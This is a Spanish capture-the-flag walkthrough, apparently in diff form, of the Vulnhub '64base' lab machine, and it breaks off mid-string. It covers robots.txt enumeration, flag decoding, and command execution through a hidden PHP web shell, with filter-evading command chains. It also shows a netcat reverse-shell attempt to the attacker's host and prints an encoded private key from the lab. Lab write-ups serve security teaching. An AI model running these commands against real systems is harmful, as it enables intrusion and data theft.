+Disallow: /Fighter/&lt;br /&gt;
+Disallow: /fighters/&lt;br /&gt;
+Disallow: /fire/&lt;br /&gt;
+Disallow: /first-shot/&lt;br /&gt;
+Disallow: /five/&lt;br /&gt;
+Disallow: /Five/&lt;br /&gt;
+Disallow: /Fixed/&lt;br /&gt;
+Disallow: /flaming/&lt;br /&gt;
+Disallow: /Fleet/&lt;br /&gt;
+Disallow: /fleets/&lt;br /&gt;
+Disallow: /following/&lt;br /&gt;
+Disallow: /for/&lt;br /&gt;
+Disallow: /for-/&lt;br /&gt;
+Disallow: /Force/&lt;br /&gt;
+Disallow: /forces/&lt;br /&gt;
+Disallow: /freedom/&lt;br /&gt;
+Disallow: /from/&lt;br /&gt;
+Disallow: /front/&lt;br /&gt;
+Disallow: /g/&lt;br /&gt;
+Disallow: /G/&lt;br /&gt;
+Disallow: /Galactic/&lt;br /&gt;
+Disallow: /Galactica/&lt;br /&gt;
+Disallow: /galaxy/&lt;br /&gt;
+Disallow: /Gallery/&lt;br /&gt;
+Disallow: /garrison/&lt;br /&gt;
+Disallow: /great/&lt;br /&gt;
+Disallow: /ground/&lt;br /&gt;
+Disallow: /group/&lt;br /&gt;
+Disallow: /guard/&lt;br /&gt;
+Disallow: /Guard/&lt;br /&gt;
+Disallow: /Han/&lt;br /&gt;
+Disallow: /Hanger/&lt;br /&gt;
+Disallow: /has/&lt;br /&gt;
+Disallow: /have/&lt;br /&gt;
+Disallow: /heavily-armoured/&lt;br /&gt;
+Disallow: /Heavy/&lt;br /&gt;
+Disallow: /heroes/&lt;br /&gt;
+Disallow: /HH/&lt;br /&gt;
+Disallow: /-HH–/&lt;br /&gt;
+Disallow: /HHH/&lt;br /&gt;
+Disallow: /HHHHH/&lt;br /&gt;
+Disallow: /HHHHHHHHHHHHHH/&lt;br /&gt;
+Disallow: /high/&lt;br /&gt;
+Disallow: /hope/&lt;br /&gt;
+Disallow: /houses/&lt;br /&gt;
+Disallow: /humans/&lt;br /&gt;
+Disallow: /Imperial/&lt;br /&gt;
+Disallow: /Imperial-class/&lt;br /&gt;
+Disallow: /individual/&lt;br /&gt;
+Disallow: /initial/&lt;br /&gt;
+Disallow: /instituted/&lt;br /&gt;
+Disallow: /intelligent/&lt;br /&gt;
+Disallow: /Interrogation/&lt;br /&gt;
+Disallow: /Intruder/&lt;br /&gt;
+Disallow: /is/&lt;br /&gt;
+Disallow: /issued/&lt;br /&gt;
+Disallow: /It/&lt;br /&gt;
+Disallow: /its/&lt;br /&gt;
+Disallow: /j8PY8i/&lt;br /&gt;
+Disallow: /keeps/&lt;br /&gt;
+Disallow: /kill/&lt;br /&gt;
+Disallow: /killing/&lt;br /&gt;
+Disallow: /known/&lt;br /&gt;
+Disallow: /Kuat/&lt;br /&gt;
+Disallow: /l/&lt;br /&gt;
+Disallow: /-l/&lt;br /&gt;
+Disallow: /L/&lt;br /&gt;
+Disallow: /Labs/&lt;br /&gt;
+Disallow: /Landing/&lt;br /&gt;
+Disallow: /Laser/&lt;br /&gt;
+Disallow: /Launch/&lt;br /&gt;
+Disallow: /Lennert/&lt;br /&gt;
+Disallow: /level/&lt;br /&gt;
+Disallow: /levels/&lt;br /&gt;
+Disallow: /Lever/&lt;br /&gt;
+Disallow: /Light/&lt;br /&gt;
+Disallow: /line/&lt;br /&gt;
+Disallow: /ll/&lt;br /&gt;
+Disallow: /located/&lt;br /&gt;
+Disallow: /long/&lt;br /&gt;
+Disallow: /longer/&lt;br /&gt;
+Disallow: /LS/&lt;br /&gt;
+Disallow: /Luke/&lt;br /&gt;
+Disallow: /M/&lt;br /&gt;
+Disallow: /machi-/&lt;br /&gt;
+Disallow: /machine/&lt;br /&gt;
+Disallow: /made/&lt;br /&gt;
+Disallow: /magical/&lt;br /&gt;
+Disallow: /Maintenance/&lt;br /&gt;
+Disallow: /Medical/&lt;br /&gt;
+Disallow: /Meeting/&lt;br /&gt;
+Disallow: /members/&lt;br /&gt;
+Disallow: /Merr-Sonn/&lt;br /&gt;
+Disallow: /meters/&lt;br /&gt;
+Disallow: /MilleniumFalconSide/&lt;br /&gt;
+Disallow: /MilleniumFalconTop/&lt;br /&gt;
+Disallow: /Miscellaneous/&lt;br /&gt;
+Disallow: /mission/&lt;br /&gt;
+Disallow: /Mission/&lt;br /&gt;
+Disallow: /Monitors/&lt;br /&gt;
+Disallow: /monster/&lt;br /&gt;
+Disallow: /monsters/&lt;br /&gt;
+Disallow: /motivator/&lt;br /&gt;
+Disallow: /multi-function/&lt;br /&gt;
+Disallow: /mystical/&lt;br /&gt;
+Disallow: /n/&lt;br /&gt;
+Disallow: /nel/&lt;br /&gt;
+Disallow: /nery/&lt;br /&gt;
+Disallow: /Neutronic/&lt;br /&gt;
+Disallow: /New/&lt;br /&gt;
+Disallow: /nn/&lt;br /&gt;
+Disallow: /-nn–/&lt;br /&gt;
+Disallow: /no/&lt;br /&gt;
+Disallow: /o/&lt;br /&gt;
+Disallow: /-o/&lt;br /&gt;
+Disallow: /o–/&lt;br /&gt;
+Disallow: /O/&lt;br /&gt;
+Disallow: /o8/&lt;br /&gt;
+Disallow: /o88888888/&lt;br /&gt;
+Disallow: /o88888/888888888/&lt;br /&gt;
+Disallow: /occupational/&lt;br /&gt;
+Disallow: /of/&lt;br /&gt;
+Disallow: /Office/r/&lt;br /&gt;
+Disallow: /Office/r/s/&lt;br /&gt;
+Disallow: /office/s/&lt;br /&gt;
+Disallow: /Offices/&lt;br /&gt;
+Disallow: /on/&lt;br /&gt;
+Disallow: /On/&lt;br /&gt;
+Disallow: /only/&lt;br /&gt;
+Disallow: /oo/&lt;br /&gt;
+Disallow: /o/———–/o/&lt;br /&gt;
+Disallow: /oo/—-/&lt;br /&gt;
+Disallow: /OO/&lt;br /&gt;
+Disallow: /OOO/&lt;br /&gt;
+Disallow: /OOOOO/&lt;br /&gt;
+Disallow: /oppression/&lt;br /&gt;
+Disallow: /or/&lt;br /&gt;
+Disallow: /order/&lt;br /&gt;
+Disallow: /Order/&lt;br /&gt;
+Disallow: /outgunned/&lt;br /&gt;
+Disallow: /Outnumbered/&lt;br /&gt;
+Disallow: /overwhelming/&lt;br /&gt;
+Disallow: /pable/&lt;br /&gt;
+Disallow: /pacity/&lt;br /&gt;
+Disallow: /Pack/&lt;br /&gt;
+Disallow: /Parking/&lt;br /&gt;
+Disallow: /Person-/&lt;br /&gt;
+Disallow: /personnel/&lt;br /&gt;
+Disallow: /Pilots/&lt;br /&gt;
+Disallow: /pistol/&lt;br /&gt;
+Disallow: /Pistol/&lt;br /&gt;
+Disallow: /planet/&lt;br /&gt;
+Disallow: /Platform/&lt;br /&gt;
+Disallow: /power/&lt;br /&gt;
+Disallow: /Power/&lt;br /&gt;
+Disallow: /powerful/&lt;br /&gt;
+Disallow: /pre-fabricated/&lt;br /&gt;
+Disallow: /primary/&lt;br /&gt;
+Disallow: /prime/&lt;br /&gt;
+Disallow: /Probe/&lt;br /&gt;
+Disallow: /process/&lt;br /&gt;
+Disallow: /programming/&lt;br /&gt;
+Disallow: /protect/&lt;br /&gt;
+Disallow: /prototypes/&lt;br /&gt;
+Disallow: /Quarters/&lt;br /&gt;
+Disallow: /rack/&lt;br /&gt;
+Disallow: /racks/&lt;br /&gt;
+Disallow: /Radar/&lt;br /&gt;
+Disallow: /rag-tag/&lt;br /&gt;
+Disallow: /Ramp/&lt;br /&gt;
+Disallow: /ratio/&lt;br /&gt;
+Disallow: /reaches/&lt;br /&gt;
+Disallow: /Rebellion/&lt;br /&gt;
+Disallow: /Rebels/&lt;br /&gt;
+Disallow: /Reception/&lt;br /&gt;
+Disallow: /Recreation/&lt;br /&gt;
+Disallow: /reflexes/&lt;br /&gt;
+Disallow: /reign/&lt;br /&gt;
+Disallow: /Release/&lt;br /&gt;
+Disallow: /renowned/&lt;br /&gt;
+Disallow: /Repair/&lt;br /&gt;
+Disallow: /Rifle/&lt;br /&gt;
+Disallow: /Rifles/&lt;br /&gt;
+Disallow: /risen/&lt;br /&gt;
+Disallow: /Room/&lt;br /&gt;
+Disallow: /rooms/&lt;br /&gt;
+Disallow: /Rooms/&lt;br /&gt;
+Disallow: /-Row/&lt;br /&gt;
+Disallow: /same/&lt;br /&gt;
+Disallow: /Science/&lt;br /&gt;
+Disallow: /Scout/&lt;br /&gt;
+Disallow: /Security/&lt;br /&gt;
+Disallow: /Sensor/&lt;br /&gt;
+Disallow: /Sensors/&lt;br /&gt;
+Disallow: /Service/&lt;br /&gt;
+Disallow: /Setting/&lt;br /&gt;
+Disallow: /shadow/&lt;br /&gt;
+Disallow: /Shield/&lt;br /&gt;
+Disallow: /SHIELD/&lt;br /&gt;
+Disallow: /shields/&lt;br /&gt;
+Disallow: /ships/&lt;br /&gt;
+Disallow: /Shops/&lt;br /&gt;
+Disallow: /Shuttle/&lt;br /&gt;
+Disallow: /Sienar/&lt;br /&gt;
+Disallow: /Sight/&lt;br /&gt;
+Disallow: /single/&lt;br /&gt;
+Disallow: /smuggler/&lt;br /&gt;
+Disallow: /Solo/&lt;br /&gt;
+Disallow: /space/&lt;br /&gt;
+Disallow: /Space/&lt;br /&gt;
+Disallow: /Speeder/&lt;br /&gt;
+Disallow: /Spy-Eye/&lt;br /&gt;
+Disallow: /staff/&lt;br /&gt;
+Disallow: /standard-design/&lt;br /&gt;
+Disallow: /Star/&lt;br /&gt;
+Disallow: /Station/&lt;br /&gt;
+Disallow: /Stock/&lt;br /&gt;
+Disallow: /Storage/&lt;br /&gt;
+Disallow: /Stormtrooper/&lt;br /&gt;
+Disallow: /strange/&lt;br /&gt;
+Disallow: /Stun/&lt;br /&gt;
+Disallow: /Suite/&lt;br /&gt;
+Disallow: /surface/&lt;br /&gt;
+Disallow: /Surface/&lt;br /&gt;
+Disallow: /Surveillance/&lt;br /&gt;
+Disallow: /System/&lt;br /&gt;
+Disallow: /systems/&lt;br /&gt;
+Disallow: /takes/&lt;br /&gt;
+Disallow: /Technical/&lt;br /&gt;
+Disallow: /terrible/&lt;br /&gt;
+Disallow: /terror/&lt;br /&gt;
+Disallow: /than/&lt;br /&gt;
+Disallow: /the/&lt;br /&gt;
+Disallow: /The/&lt;br /&gt;
+Disallow: /their/&lt;br /&gt;
+Disallow: /them/&lt;br /&gt;
+Disallow: /These/&lt;br /&gt;
+Disallow: /thick/&lt;br /&gt;
+Disallow: /this/&lt;br /&gt;
+Disallow: /This/&lt;br /&gt;
+Disallow: /thousand/thousand/&lt;br /&gt;
+Disallow: /throughout/&lt;br /&gt;
+Disallow: /Tie/&lt;br /&gt;
+Disallow: /TIE/&lt;br /&gt;
+Disallow: /time/&lt;br /&gt;
+Disallow: /to/&lt;br /&gt;
+Disallow: /Tower/&lt;br /&gt;
+Disallow: /towers/&lt;br /&gt;
+Disallow: /Towers/&lt;br /&gt;
+Disallow: /Tractor/&lt;br /&gt;
+Disallow: /trade/&lt;br /&gt;
+Disallow: /Trade/&lt;br /&gt;
+Disallow: /tresses/&lt;br /&gt;
+Disallow: /Turbolaser/&lt;br /&gt;
+Disallow: /Turbolifts/&lt;br /&gt;
+Disallow: /turned/&lt;br /&gt;
+Disallow: /Turrets/&lt;br /&gt;
+Disallow: /Twin/&lt;br /&gt;
+Disallow: /two/&lt;br /&gt;
+Disallow: /Type/&lt;br /&gt;
+Disallow: /tyranny/&lt;br /&gt;
+Disallow: /unending/&lt;br /&gt;
+Disallow: /up/&lt;br /&gt;
+Disallow: /upon/&lt;br /&gt;
+Disallow: /Use/&lt;br /&gt;
+Disallow: /usually/&lt;br /&gt;
+Disallow: /vast/&lt;br /&gt;
+Disallow: /Vehicle/&lt;br /&gt;
+Disallow: /Vent/&lt;br /&gt;
+Disallow: /versatile/&lt;br /&gt;
+Disallow: /view/&lt;br /&gt;
+Disallow: /villains/&lt;br /&gt;
+Disallow: /Visual/&lt;br /&gt;
+Disallow: /Walker/&lt;br /&gt;
+Disallow: /walls/&lt;br /&gt;
+Disallow: /war/&lt;br /&gt;
+Disallow: /Wars/&lt;br /&gt;
+Disallow: /weapon/&lt;br /&gt;
+Disallow: /weapons/&lt;br /&gt;
+Disallow: /widespread/&lt;br /&gt;
+Disallow: /with/&lt;br /&gt;
+Disallow: /wondrous/&lt;br /&gt;
+Disallow: /worlds/&lt;br /&gt;
+Disallow: /XOX/&lt;br /&gt;
+Disallow: /X-wing/&lt;br /&gt;
+Disallow: /XXXXX/XXXXX/XXXXX/&lt;br /&gt;
+Disallow: /XXXXXXXXXXXXXXXXXXXXX/&lt;br /&gt;
+Disallow: /Y8/&lt;br /&gt;
+Disallow: /Y88/&lt;br /&gt;
+Disallow: /Y888888/&lt;br /&gt;
+Disallow: /Y888888888P/&lt;br /&gt;
+Disallow: /Y8b/&lt;br /&gt;
+Disallow: /Yard/&lt;br /&gt;
+Disallow: /Zero/&lt;br /&gt;
+Disallow: /ZZ&lt;/p&gt;
+
+&lt;p&gt;Hay un montón de entradas, por lo que nos descargamos el fichero y utilizamos la herramienta dirb para ver que carpetas o ficheros existen en la máquina y cuáles son falsos positivos.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./dirb http://192.168.0.171 ~/Desktop/robots.txt -w&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Pero el resultado no nos aclara nada porque dice haber encontrado 413 carpetas de 858 posibilidades que existen en el fichero robots.txt&lt;/p&gt;
+
+&lt;p&gt;Decidimos dar una vuelta por la página web y nos encontramos con la siguiente pista.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag2_2.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Comprobamos si alguna de esas cuatro palabras está en el fichero robots.txt y efectivamente vemos que System e Imperial-class se encuentran en el fichero.
+Intentamos entrar en ellas y no hay suerte con ninguna de las dos, pero Imperial-class en la pista, empieza por C mayuscula…cambiamos el path a como indica la pista y efectivamente existe esa carpeta.Al intentar entrar nos aparece  un basic authentication.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag2_3.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Probamos el usuario y contraseña que nos dió la flag1 y son válidos!! pero parece ser que falta algo en el path, por lo que miramos el source y vemos un comentario.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag2_4.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Probamos a poner BountyHunter también en el path y obtenemos una página de login.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag2_5.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Intentamos loguear con distintos usuarios tipicos de admin:admin e incluso con el usuario y contraseña de la flag1 pero parece ser que no son correctos, por lo que pasamos a mirar el source de la página, por si hubiera algún comentario como en el caso anterior.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag2_6.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que hay un comentario que pone basictoken y una cadena en hexadecimal. Pasamos de hexadecimal a ascci y nos dá una cadena en base64 que intentamos decodear:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;echo RqMTJTbmQ1ZEVaWFFUaDFRUW89fQo= \| base64 -d&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Pero nos aparece el error de invalid input por lo que parece ser que la cadena está incompleta.
+Vemos que en la imagen donde está el basictoken también hay cadenas en hexadecimal tanto en el campo user como en el campo password, por lo que probamos a unir todas las cadenas:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c3252714d544a54626d51315a45566157464655614446525557383966516f3d0a&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;y pasarlas a ascci obteniendo la siguiente cadena en base64:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ZmxhZzJ7YUhSMGNITTZMeTkzZDNjdWVXOTFkSFZpWlM1amIyMHZkMkYwWTJnL2RqMTJTbmQ1ZEVaWFFUaDFRUW89fQo=&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Y esta vez si que decodeando el base64 nos dá la segunda flag:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;flag2{aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo=}&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;El contenido de la segunda flag es la siguiente dirección de youtube:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=vJwytFWA8uA&quot;&gt;https://www.youtube.com/watch?v=vJwytFWA8uA&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Donde aparece un video de Darth Vader con una url todo el rato en pantalla “www.yourburp.com” y el título de Darth Vader use Burp.&lt;/p&gt;
+
+&lt;p&gt;Lo que nos indica claramente que tenemos que utilizar BurpSuite o cualquier otro programa capaz de interceptar las peticiones.&lt;/p&gt;
+
+&lt;p&gt;Volvemos a realizar las acciones de login con Burp y vemos que cuando se envía los datos del login se produce el envío de la información a login.php y su respuesta nos muestra la flag3, haciendo luego una redirección a index.php&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag3_1.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;flag3{NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2l
+uLnBocD9mPWV4ZWMmYz1pZAo=}&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;EL contenido de la flag 3 es:&lt;br /&gt;
+“53cr3t5h377/Imperial-Class/BountyHunter/login.php?f=exec&amp;amp;c=id”&lt;/p&gt;
+
+&lt;p&gt;Lo que nos indica que hay una shell secreta (53cr3t5h377) en el path indicado.&lt;/p&gt;
+
+&lt;p&gt;Entramos en ese path y observamos lo siguiente:
+&lt;img src=&quot;/images/Vulnhub/64base/flag4_1.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Metemos algunos comando en el parámetro “c” pero vemos que no ocurre nada, cuando caemos en la cuenta que en la páginad de post.html se nos dá una pista remarcado en amarillo donde indica “DON’T USE EXEC USE SYSTEM” que hemos marcado en fotos anteriores en rojo con una flecha.&lt;/p&gt;
+
+&lt;p&gt;Por lo que cambiamos “exec” por “system” en el parámetro “f” y obtenemos la flag4&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag4_2.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;cuyo contenido es &lt;strong&gt;64base:64base5h377&lt;/strong&gt; lo que indica que son otras credenciales.&lt;/p&gt;
+
+&lt;p&gt;Probamos estas credenciales en el basic authentication del path /admin/ y  en la conexión ssh pero ambos sin resultado.&lt;/p&gt;
+
+&lt;p&gt;Trás esto lo primero que hice fué dumpear el contenido de login.php en un fichero de texto para ver el source del fichero y comprobar que efectivamente se estaban realizando filtrado de caracteres.&lt;/p&gt;
+
+&lt;p&gt;Despúes lo primero que se me viene a la cabeza es conectarme a mi máquina host con una shell mediante el comando “nc 192.168.0.154 4444” pero parece ser que lo han tenido encuenta ya que nos muestran el siguiente gato:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag5_1.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Después de un buen rato y estar probando distintos comandos, encontramos algunos que nos son útiles como wget, locale, xargs, find, grep… mediante prueba y error conseguimos localizar la flag5 con el siguiente comando.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;locale admin\| grep html\| xargs find&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag5_2.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Obteniendo la flag5:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;/var/www/html/admin/S3cR37/flag5{TG9vayBJbnNpZGUhIDpECg==}&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;que decodeado el contenido es “Look Inside! :D”&lt;/p&gt;
+
+&lt;p&gt;Otra forma de haber conseguido está flag hubiera sido levantar un apache/ngix localmente he intentar con wget dumpear una shell o una shell inversa.&lt;/p&gt;
+
+&lt;p&gt;Por lo que tenemos que intentar coger el fichero con nombre “flag5{TG9vayBJbnNpZGUhIDpECg==}”&lt;/p&gt;
+
+&lt;p&gt;Para ello lo que hacemos es buscamos el fichero específico y lo copiamos al directorio actual donde estamos.&lt;/p&gt;
+
+&lt;p&gt;El comando utilizado es:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;locale admin \| grep html \| xargs find \| grep TG9vay \| xargs cp .&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Intentamos entrar al fichero por el navegador pero nos devuelve un error 403, lo que indica que no tenemos permisos suficientes, por lo que vamos a cambiar los permisos con el siguiente comando:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;randmoms_chars \| ls \| grep flag5 \| xargs chmod 0666&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora accediendo por el navegador si podemos ver el contenido del fichero, que resulta ser una imagen.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag5_3.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos descargamos la imagen para examinarla con wget a nuestra máquina y la abrimos con un editor hexadecimal.&lt;/p&gt;
+
+&lt;p&gt;En ella podemos ver una cadena en hexadecimal muy larga&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;4c5330744c5331435255644a546942535530456755464a4a566b46555253424c52566b744c5330744c517051636d396a4c565235634755364944517352553544556c6c5156455645436b52460a5379314a626d5a764f69424252564d744d5449344c554e43517977324d6a46424d7a68425155513052546c475155457a4e6a55335130457a4f44673452446c434d7a553251776f4b625552300a556e684a643267304d464a54546b467a4d697473546c4a49646c4d356557684e4b325668654868564e586c795231424461334a6955566376556d64515543745352307043656a6c57636c52720a646c6c334e67705a59303931575756615457707a4e475a4a55473433526c7035536d64345230686f5533685262336857626a6c7252477433626e4e4e546b5270636e526a62304e50617a6c530a524546484e5756344f58673056453136436a684a624552435558453161546c5a656d6f35646c426d656d56435246706b53586f35524863795a323479553246465a335531656d56734b7a5a490a52303969526a686161444e4e53574e6f6554687a4d5668795254414b61335a4d53306b794e544a74656c64334e47746955334d354b31466856336c6f4d7a52724f45704a566e7031597a46520a51336c69656a56586231553157545532527a5a784d564a6b637a426959315a785446567a5a51704e5533704c617a4e745332465851586c4d574778764e3078756258467856555a4c5347356b0a516b557855326851566c5a704e47497752336c475355785054335a3062585a47596a5172656d68314e6d705056316c49436d73796147524453453554644374705a3264354f57686f4d3270680a52576456626c4e51576e56464e30354b6430525a5954646c553052685a3077784e31684c634774744d6c6c70516c5a7956566834566b31756232494b643168535a6a56435930644c56546b330a65475276636c59795648457261446c4c553278615a5463354f58527956484a475230356c4d4456326545527961576f315658517953324e52654373354f457334533342585441706e645570510a556c424c52326c71627a6b3253455248597a4e4d4e566c7a65453969566d63724c325a714d4546326330746d636d4e574c327834595663725357313562574d7854566870536b316962554e360a62455233436c52425632316863577453526b52355154464956585a30646c4e6c566e46544d533949616d6845647a6c6b4e45747a646e4e71613270326557565256484e7a5a6e4e6b52324e560a4d47684561316833556c647a6332514b4d6d517a5279744f616d3078556a56615445356e556d784f63465a48616d684c517a524263325a59557a4e4b4d486f7964444e4355453035576b39430a54554a6c4f5552344f4870744e58684757546c365633527964677042523342794d454a6f4f45745264323177616c4656597a46685a6e4e78595646594d465649546b7859564446615431644c0a616d63305530457a57454d355a454e4665555a784d464e4a65464671547a6c4d52304e48436a52524e57356a5a6c566f62585a3063586c3164454e7362444a6b5746427a57465a455a54526c0a6230517851327432536b354557544e4c554663725232744f4f5577724f554e516554677252453531626b5a4a6433674b4b3151724b7a64525a7939315546684c6354524e4e6a464a555467770a4d7a52566148565356314d30564846514f57463657444e44527a6c4d65573970516a5a57596b74505a555233546a68686157784d533170436377706d57546c524e6b464e4d584e3562476c360a53444675626e684c5433526155566431636e68715230704353584d324d6e526c6245317259584d356555354e617a4e4d64546478556b6732633364504f584e6b56454a70436974714d4867300a64555261616b706a5a30315965475a694d4863315154593062466c4763303153656b5a714e31686b5a6e6b784f53744e5a54684b525768524f45744f57455233555574456556564d526b39550a63336f4b4d544e575a6b4a4f65466c7a65557731656b6459546e703563566f3053533950547a644e5a575179616a4248656a426e4d6a4670534545764d445a74636e4d795932786b637a5a540a56554a4852585a754f4535705667707955334a494e6e5a46637a5254656d63776544686b5a45643255544278567a463254577455556e557a54336b765a544577526a63304e586845545546550a53314a7353316f32636c6c4954554e34536a4e4a59323530436b56364d45394e57466c6b517a5a4461555976535664305a3252564b32684c65585a7a4e484e4764454e4359327854595764740a5246524b4d6d74615a485530556c4a3357565a574e6d394a546e6f35596e4250646b554b556e677a534656785a6d354c553268796458704e4f56707261556c7264564e6d556e526d615531320a596c52365a6d5a4b56464d30597a513451303831574339535a5559765157464e654774695532524654305a7a53517047646a6c595a476b355532524f6458684853455579527a5249646b706b0a53584279526c5679566c4e7755306b344d48646e636d49794e44567a647a5a6e5647397064466f354d47684b4e47354b4e5746354e304648436c6c7059574531627a63344e7a63765a6e63320a57566f764d6c557a5155526b61564e50516d3072614770574d6b705765484a7665565659596b63315a475a734d32303452335a6d4e7a464b4e6a4a4753484534646d6f4b63557068626c4e720a4f4445334e586f77596d70795746646b5445637a52464e735355707063327851567974355247466d4e316c43566c6c33563149725645457861304d326157564a5154563056544e776269394a0a4d776f324e466f31625842444b3364785a6c52345232646c51334e6e53577335646c4e754d6e41765a5756305a456b7a5a6c46584f46645952564a69524756304d56564d5346427864456c700a4e314e61596d6f3464697451436d5a7553457852646b563353584d72516d59785133424c4d554672576d565654564a4655577443614552704e7a4a49526d4a334d6b6376656e46306153395a0a5a4735786545463562445a4d576e704a5a5646754f48514b4c3064714e477468636b6f78615530355357597a4f57524e4e55396851315a615569395554304a575956493462584a514e315a300a536d39794f57706c53444a305255777764473946635664434d56424c4d48565955416f744c5330744c55564f524342535530456755464a4a566b46555253424c52566b744c5330744c516f3d0a&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;que pasamos a ascci obteniendo un texto en base64:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
+LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
+Sy1JbmZvOiBBRVMtMTI4LUNCQyw2MjFBMzhBQUQ0RTlGQUEzNjU3Q0EzODg4RDlCMzU2QwoKbUR0
+UnhJd2g0MFJTTkFzMitsTlJIdlM5eWhNK2VheHhVNXlyR1BDa3JiUVcvUmdQUCtSR0pCejlWclRr
+dll3NgpZY091WWVaTWpzNGZJUG43Rlp5Smd4R0hoU3hRb3hWbjlrRGt3bnNNTkRpcnRjb0NPazlS
+REFHNWV4OXg0VE16CjhJbERCUXE1aTlZemo5dlBmemVCRFpkSXo5RHcyZ24yU2FFZ3U1emVsKzZI
+R09iRjhaaDNNSWNoeThzMVhyRTAKa3ZMS0kyNTJteld3NGtiU3M5K1FhV3loMzRrOEpJVnp1YzFR
+Q3liejVXb1U1WTU2RzZxMVJkczBiY1ZxTFVzZQpNU3pLazNtS2FXQXlMWGxvN0xubXFxVUZLSG5k
+QkUxU2hQVlZpNGIwR3lGSUxPT3Z0bXZGYjQremh1NmpPV1lICmsyaGRDSE5TdCtpZ2d5OWhoM2ph
+RWdVblNQWnVFN05Kd0RZYTdlU0RhZ0wxN1hLcGttMllpQlZyVVh4Vk1ub2IKd1hSZjVCY0dLVTk3
+eGRvclYyVHEraDlLU2xaZTc5OXRyVHJGR05lMDV2eERyaWo1VXQyS2NReCs5OEs4S3BXTApndUpQ
+UlBLR2lqbzk2SERHYzNMNVlzeE9iVmcrL2ZqMEF2c0tmcmNWL2x4YVcrSW15bWMxTVhpSk1ibUN6
+bER3ClRBV21hcWtSRkR5QTFIVXZ0dlNlVnFTMS9IamhEdzlkNEtzdnNqa2p2eWVRVHNzZnNkR2NV
+MGhEa1h3Uldzc2QKMmQzRytOam0xUjVaTE5nUmxOcFZHamhLQzRBc2ZYUzNKMHoydDNCUE05Wk9C
+TUJlOUR4OHptNXhGWTl6V3RydgpBR3ByMEJoOEtRd21walFVYzFhZnNxYVFYMFVITkxYVDFaT1dL
+amc0U0EzWEM5ZENFeUZxMFNJeFFqTzlMR0NHCjRRNW5jZlVobXZ0cXl1dENsbDJkWFBzWFZEZTRl
